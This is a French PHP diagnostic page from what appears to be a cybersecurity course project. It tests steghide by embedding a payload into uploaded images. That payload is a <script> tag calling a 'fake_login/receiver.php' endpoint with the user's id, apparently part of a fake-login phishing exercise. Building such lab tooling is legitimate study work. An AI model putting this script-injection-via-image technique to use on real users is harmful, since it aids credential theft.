<?php
/**
 * Page de diagnostic Steghide
 * Pour déboguer les problèmes de buffer overflow
 */

session_start();

if (!isset($_SESSION["user_id"])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION["user_id"];
$upload_dir = __DIR__ . '/../uploads/images/';

?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Debug Steghide - Analyse des Erreurs</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        
        h1 {
            color: #333;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .section {
            margin: 30px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        
        .section h2 {
            color: #667eea;
            margin-bottom: 15px;
        }
        
        .info-table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }
        
        .info-table tr {
            border-bottom: 1px solid #ddd;
        }
        
        .info-table td {
            padding: 12px;
        }
        
        .info-table td:first-child {
            font-weight: bold;
            width: 200px;
            color: #667eea;
        }
        
        .status-ok {
            color: #28a745;
            font-weight: bold;
        }
        
        .status-warning {
            color: #ffc107;
            font-weight: bold;
        }
        
        .status-error {
            color: #dc3545;
            font-weight: bold;
        }
        
        .form-group {
            margin: 20px 0;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #333;
        }
        
        input[type="file"],
        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        
        button {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        
        button:hover {
            background: #764ba2;
        }
        
        .result {
            margin-top: 20px;
            padding: 20px;
            border-radius: 8px;
            line-height: 1.8;
        }
        
        .result-success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }
        
        .result-error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }
        
        .result-warning {
            background: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
        }
        
        code {
            background: #f0f0f0;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: monospace;
        }
        
        pre {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 Diagnostique Steghide - Debug</h1>
        
        <div class="section">
            <h2>📊 Vérification du Système</h2>
            <table class="info-table">
                <tr>
                    <td>Utilisateur connecté:</td>
                    <td><?php echo htmlspecialchars($_SESSION["username"] ?? "Inconnu"); ?></td>
                </tr>
                <tr>
                    <td>Dossier uploads:</td>
                    <td><code><?php echo $upload_dir; ?></code></td>
                </tr>
                <tr>
                    <td>Dossier accessible:</td>
                    <td class="<?php echo is_dir($upload_dir) ? 'status-ok' : 'status-error'; ?>">
                        <?php echo is_dir($upload_dir) ? '✅ Oui' : '❌ Non'; ?>
                    </td>
                </tr>
                <tr>
                    <td>Dossier writable:</td>
                    <td class="<?php echo is_writable($upload_dir) ? 'status-ok' : 'status-error'; ?>">
                        <?php echo is_writable($upload_dir) ? '✅ Oui' : '❌ Non'; ?>
                    </td>
                </tr>
                <tr>
                    <td>Steghide version:</td>
                    <td>
                        <?php
                        $output = [];
                        exec("LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:/usr/lib:/lib/x86_64-linux-gnu:/lib /usr/bin/steghide --version 2>&1", $output);
                        echo $output[0] ?? "❌ Introuvable";
                        ?>
                    </td>
                </tr>
            </table>
        </div>
        
        <div class="section">
            <h2>🧪 Test Interactif</h2>
            
            <form method="POST" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="test_image">Sélectionnez une image pour tester:</label>
                    <input type="file" id="test_image" name="test_image" accept="image/*">
                </div>
                
                <button type="submit" name="action" value="test_upload">🔍 Analyser l'Image</button>
            </form>
            
            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
                if ($_POST['action'] === 'test_upload' && isset($_FILES['test_image'])) {
                    $file = $_FILES['test_image'];
                    
                    echo "<div class='result result-warning'>";
                    echo "<h3>📋 Analyse de l'Image Uploadée</h3>";
                    
                    // Infos fichier
                    echo "<p><strong>Nom du fichier:</strong> " . htmlspecialchars($file['name']) . "</p>";
                    echo "<p><strong>Type MIME rapporté:</strong> " . htmlspecialchars($file['type']) . "</p>";
                    echo "<p><strong>Taille rapportée:</strong> " . round($file['size'] / 1024, 2) . " KB</p>";
                    
                    // Copier vers un dossier temporaire
                    $temp_upload = $upload_dir . 'debug_' . time() . '_' . basename($file['name']);
                    
                    if (move_uploaded_file($file['tmp_name'], $temp_upload)) {
                        echo "<p class='status-ok'>✅ Fichier uploadé avec succès</p>";
                        
                        // Analyse du vrai fichier
                        $finfo = finfo_open(FILEINFO_MIME_TYPE);
                        $real_mime = finfo_file($finfo, $temp_upload);
                        finfo_close($finfo);
                        
                        $image_size = filesize($temp_upload);
                        $image_info = @getimagesize($temp_upload);
                        
                        echo "<table class='info-table'>";
                        echo "<tr><td>Type MIME réel:</td><td><code>$real_mime</code></td></tr>";
                        echo "<tr><td>Taille réelle:</td><td>" . round($image_size / 1024, 2) . " KB (" . $image_size . " bytes)</td></tr>";
                        
                        if ($image_info !== false) {
                            echo "<tr><td>Dimensions:</td><td>" . $image_info[0] . "x" . $image_info[1] . " pixels</td></tr>";
                        } else {
                            echo "<tr><td>Dimensions:</td><td class='status-error'>❌ Impossible de lire</td></tr>";
                        }
                        
                        echo "</table>";
                        
                        // Calcul pour le payload
                        $payload_size = 120; // Estimation du payload
                        $min_image_size = $payload_size * 10;
                        
                        echo "<h3 style='margin-top: 20px;'>📦 Calcul Capacité Steghide</h3>";
                        echo "<table class='info-table'>";
                        echo "<tr><td>Taille payload estimée:</td><td>" . $payload_size . " bytes</td></tr>";
                        echo "<tr><td>Taille image minimale requise:</td><td>" . round($min_image_size / 1024, 2) . " KB (" . $min_image_size . " bytes)</td></tr>";
                        echo "<tr><td>Taille image actuelle:</td><td>" . round($image_size / 1024, 2) . " KB (" . $image_size . " bytes)</td></tr>";
                        echo "<tr><td>Résultat:</td><td class='" . ($image_size >= $min_image_size ? 'status-ok' : 'status-error') . "'>";
                        echo $image_size >= $min_image_size ? "✅ COMPATIBLE" : "❌ TROP PETITE!";
                        echo "</td></tr>";
                        echo "</table>";
                        
                        // Test Steghide
                        if ($image_info !== false) {
                            echo "<h3 style='margin-top: 20px;'>⚙️ Test Steghide</h3>";
                            
                            $payload_file = $upload_dir . 'debug_payload_' . time() . '.txt';
                            $payload_content = '<script src="/projects/MDI/cyber-securite/messagerie/codes/fake_login/receiver.php?sender=' . $user_id . '"></script>';
                            file_put_contents($payload_file, $payload_content);
                            
                            $output_file = $upload_dir . 'debug_output_' . time() . '.jpg';
                            $cmd = "LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:/usr/lib:/lib/x86_64-linux-gnu:/lib /usr/bin/steghide embed -cf " . escapeshellarg($temp_upload) . " -ef " . escapeshellarg($payload_file) . " -sf " . escapeshellarg($output_file) . " -p '' -f 2>&1";
                            
                            $output = [];
                            $return_var = 0;
                            exec($cmd, $output, $return_var);
                            
                            echo "<p><strong>Commande:</strong></p>";
                            echo "<pre>" . htmlspecialchars($cmd) . "</pre>";
                            
                            echo "<p><strong>Code retour:</strong> <code>$return_var</code></p>";
                            
                            if ($return_var === 0 && file_exists($output_file)) {
                                echo "<p class='status-ok'>✅ Steghide a réussi!</p>";
                                echo "<p>Fichier output: " . round(filesize($output_file) / 1024, 2) . " KB</p>";
                            } else {
                                echo "<p class='status-error'>❌ Steghide a échoué!</p>";
                                echo "<p><strong>Messages d'erreur:</strong></p>";
                                echo "<pre>" . htmlspecialchars(implode("\n", $output)) . "</pre>";
                            }
                            
                            @unlink($payload_file);
                            @unlink($output_file);
                        }
                        
                        @unlink($temp_upload);
                    } else {
                        echo "<p class='status-error'>❌ Erreur lors de l'upload</p>";
                    }
                    
                    echo "</div>";
                }
            }
            ?>
        </div>
        
        <div class="section">
            <h2>💡 Recommandations</h2>
            
            <div class="result result-warning">
                <p><strong>Si vous obtenez une erreur buffer overflow:</strong></p>
                <ul style="margin-left: 20px; margin-top: 10px;">
                    <li>✅ Utilisez une image <strong>TRÈS GRANDE</strong> (1920x1280 ou plus)</li>
                    <li>✅ Taille minimale recommandée: <strong>200KB+</strong></li>
                    <li>✅ Téléchargez depuis: <strong>https://picsum.photos/1920/1280</strong></li>
                    <li>❌ Évitez les petites images (< 100x100 pixels)</li>
                    <li>❌ Évitez les images corrompues ou renommées</li>
                </ul>
            </div>
        </div>
        
        <div style="text-align: center; margin-top: 30px;">
            <a href="steganography.php" style="color: #667eea; text-decoration: none; font-weight: bold;">
                ← Retour à Stéganographie
            </a>
        </div>
    </div>
</body>
</html>
